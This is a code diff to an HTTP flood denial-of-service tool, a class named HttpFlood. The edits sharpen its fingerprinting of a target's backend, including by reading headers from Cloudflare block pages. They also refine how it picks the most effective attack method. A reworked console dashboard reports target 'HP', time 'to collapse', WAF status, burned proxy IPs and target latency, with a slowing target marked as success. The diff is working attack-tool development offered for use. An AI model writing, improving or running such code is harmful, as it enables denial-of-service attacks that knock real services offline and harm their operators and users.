@@ -5095,7 +5095,7 @@ class HttpFlood(Thread):
     def _chaos_detect_backend(self):
         """Deep backend technology detection from response headers and behavior."""
         intel = self._chaos_intel
-        if intel.get("backend_lang"):
+        if intel.get("backend_lang") and intel["backend_lang"] != "unknown":
             return  # Already detected
             
         try:
@@ -5115,40 +5115,54 @@ class HttpFlood(Thread):
                     req = urllib.request.Request(url, headers={
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                     })
-                    with urllib.request.urlopen(req, timeout=5) as resp:
-                        headers = str(resp.headers).lower()
-                        powered_by = resp.headers.get('X-Powered-By', '').lower()
-                        body = resp.read(4096).decode('utf-8', errors='ignore').lower()
+                    hdrs_str = ''
+                    powered_by = ''
+                    body = ''
+                    try:
+                        with urllib.request.urlopen(req, timeout=5) as resp:
+                            hdrs_str = str(resp.headers).lower()
+                            powered_by = resp.headers.get('X-Powered-By', '').lower()
+                            body = resp.read(4096).decode('utf-8', errors='ignore').lower()
+                    except urllib.error.HTTPError as e:
+                        # [V52] Cloudflare 403/503 still has headers we can analyze!
+                        if hasattr(e, 'headers'):
+                            hdrs_str = str(e.headers).lower()
+                            powered_by = e.headers.get('X-Powered-By', '').lower() if e.headers else ''
+                        try:
+                            body = e.read(4096).decode('utf-8', errors='ignore').lower()
+                        except: pass
+                    
+                    all_text = hdrs_str + ' ' + powered_by + ' ' + body
+                    
+                    # Detect backend language
+                    if 'php' in powered_by or 'x-powered-by: php' in hdrs_str:
+                        intel["backend_lang"] = "php"
+                    elif 'express' in powered_by:
+                        intel["backend_lang"] = "nodejs"
+                        intel["backend_framework"] = "express"
+                    elif 'asp.net' in all_text:
+                        intel["backend_lang"] = "aspnet"
+                    elif 'django' in body or 'csrfmiddlewaretoken' in body:
+                        intel["backend_lang"] = "python"
+                        intel["backend_framework"] = "django"
+                    elif 'flask' in hdrs_str or 'werkzeug' in hdrs_str:
+                        intel["backend_lang"] = "python"
+                        intel["backend_framework"] = "flask"
+                    elif '__next' in body or 'x-powered-by: next' in hdrs_str:
+                        intel["backend_lang"] = "nodejs"
+                        intel["backend_framework"] = "nextjs"
+                    elif 'laravel_session' in all_text or 'xsrf-token' in all_text:
+                        intel["backend_lang"] = "php"
+                        intel["backend_framework"] = "laravel"
+                    elif 'phusion passenger' in hdrs_str:
+                        intel["backend_lang"] = "ruby"
+                        intel["backend_framework"] = "rails"
+                    elif 'spring' in hdrs_str or 'jsessionid' in all_text:
+                        intel["backend_lang"] = "java"
+                        intel["backend_framework"] = "spring"
                         
-                        # Detect backend language
-                        if 'php' in powered_by or 'php' in headers:
-                            intel["backend_lang"] = "php"
-                        elif 'express' in powered_by or 'x-powered-by: express' in headers:
-                            intel["backend_lang"] = "nodejs"
-                            intel["backend_framework"] = "express"
-                        elif 'asp.net' in powered_by or 'asp.net' in headers:
-                            intel["backend_lang"] = "aspnet"
-                        elif 'django' in body or 'csrfmiddlewaretoken' in body:
-                            intel["backend_lang"] = "python"
-                            intel["backend_framework"] = "django"
-                        elif 'flask' in headers or 'werkzeug' in headers:
-                            intel["backend_lang"] = "python"
-                            intel["backend_framework"] = "flask"
-                        elif 'x-powered-by: next' in headers or '__next' in body:
-                            intel["backend_lang"] = "nodejs"
-                            intel["backend_framework"] = "nextjs"
-                        elif 'phusion passenger' in headers or 'x-powered-by: passenger' in headers:
-                            intel["backend_lang"] = "ruby"
-                            intel["backend_framework"] = "rails"
-                        elif 'laravel' in headers or 'laravel_session' in headers:
-                            intel["backend_lang"] = "php"
-                            intel["backend_framework"] = "laravel"
-                        elif 'spring' in headers or 'jsessionid' in headers:
-                            intel["backend_lang"] = "java"
-                            intel["backend_framework"] = "spring"
-                            
-                        if intel.get("backend_lang"):
-                            break
+                    if intel.get("backend_lang") and intel["backend_lang"] != "unknown":
+                        break
                 except Exception:
                     continue
                     
@@ -6307,9 +6321,14 @@ class HttpFlood(Thread):
                 weights[method_name] = max(int(weights[method_name] * 0.6), 1)
                 
             # Track best and worst performers
-            if not intel["best_method"] or success_rate > history.get(intel["best_method"], [0])[-1:][0] if history.get(intel["best_method"]) else 0:
+            current_best = intel.get("best_method")
+            if current_best and current_best in history and history[current_best]:
+                best_rate = sum(history[current_best][-20:]) / len(history[current_best][-20:])
+            else:
+                best_rate = -1
+            if success_rate > best_rate:
                 intel["best_method"] = method_name
-            if not intel["worst_method"] or (success_rate < 0.3 and len(recent) > 5):
+            if success_rate < 0.3 and len(recent) > 5:
                 intel["worst_method"] = method_name
         
         # === STRATEGY H: Experience Database Lookup ===
@@ -7310,8 +7329,18 @@ class HttpFlood(Thread):
                         print(f"  Predicted   : {bcolors.WARNING}~{ttd//60}m {ttd%60}s to collapse{bcolors.RESET}")
                     else:
                         print(f"  Predicted   : {bcolors.FAIL}~{ttd//60}m to collapse (resilient target){bcolors.RESET}")
-                # Infrastructure map
-                backend = intel.get("backend_lang", "?")
+                # Infrastructure map — use multiple sources for backend display
+                backend = intel.get("backend_lang")
+                if not backend or backend in ("unknown", "?", None):
+                    # Fallback to V8 profiler data
+                    cms = intel.get("cms_type", "")
+                    srv = intel.get("server_type", "")
+                    if cms and cms not in ("custom", "unknown"):
+                        backend = f"{cms}" 
+                    elif srv:
+                        backend = f"{srv}"
+                    else:
+                        backend = "?"
                 framework = intel.get("backend_framework", "")
                 resource = intel.get("resource_target", "auto")
                 cog = intel.get("cognitive_state", "LEARNING")
@@ -7326,15 +7355,32 @@ class HttpFlood(Thread):
                 print(f"  Target HP   : {health_indicator}")
                 cooldown_str = f" {bcolors.WARNING}[COOLDOWN ACTIVE]{bcolors.RESET}" if intel.get("stealth_cooldown", 0) > 0 else ""
                 print(f"  WAF Status  : {waf_status} | Anomaly: {intel.get('anomaly_score', 0)}/100{cooldown_str}")
-                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
+                # [V52] best_method fallback: if still None, show the most used method
+                bm = intel.get('best_method')
+                if not bm:
+                    tbm = intel.get("total_requests_by_method", {})
+                    if tbm:
+                        bm = max(tbm, key=tbm.get)
+                    else:
+                        bm = 'Calibrating...'
+                print(f"  Best Method : {bcolors.OKGREEN}{bm}{bcolors.RESET}")
                 print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
                 print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
-                # Show response time trend
+                # [V52] Show real latency from direct ping, not stale health_history
                 hp = intel.get("health_history", [])
                 if hp:
-                    avg_rt = sum(hp[-5:]) / len(hp[-5:])
-                    trend = "RISING" if len(hp) >= 2 and hp[-1] > hp[-2] else "STABLE"
-                    print(f"  Latency     : {int(avg_rt)}ms ({trend})")
+                    latest_rt = hp[-1]
+                    avg_rt = sum(hp[-3:]) / min(len(hp), 3)
+                    if len(hp) >= 2:
+                        if hp[-1] > hp[-2] * 1.5:
+                            trend = f"{bcolors.OKGREEN}RISING (target slowing!){bcolors.RESET}"
+                        elif hp[-1] < hp[-2] * 0.7:
+                            trend = f"{bcolors.FAIL}DROPPING (target recovering){bcolors.RESET}"
+                        else:
+                            trend = "STABLE"
+                    else:
+                        trend = "MEASURING"
+                    print(f"  Latency     : {int(latest_rt)}ms avg:{int(avg_rt)}ms ({trend})")
                 eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
                 if eff_str:
                     print(f"  Efficiency  : {eff_str}")
